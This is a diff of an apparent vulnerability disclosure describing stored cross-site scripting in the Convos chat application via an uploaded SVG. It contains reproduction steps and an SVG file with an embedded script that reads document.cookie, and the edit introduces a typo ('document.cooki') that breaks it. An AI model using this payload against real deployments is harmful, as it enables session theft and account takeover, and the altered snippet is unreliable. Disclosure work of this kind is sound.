@@ -15,7 +15,6 @@ This allow an attacker to steal user session ,account takeover ,redirect user to
 
 ## Proof Of Concept
 Step 1: Download the package/product from github repository https://github.com/convos-chat/convos and configure on localhost as per instruction.
-
 Step 2: Login into the application with valid credentials.
 
 Step 3: Navigate to chat and upload a svg file via upload functionality with below malicious JavaScript payload in it.
@@ -24,9 +23,8 @@ Step 3: Navigate to chat and upload a svg file via upload functionality with bel
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
    <script type="text/javascript">
-      alert(document.cookie);
+      alert(document.cooki);
    </script>
 </svg>
 ```
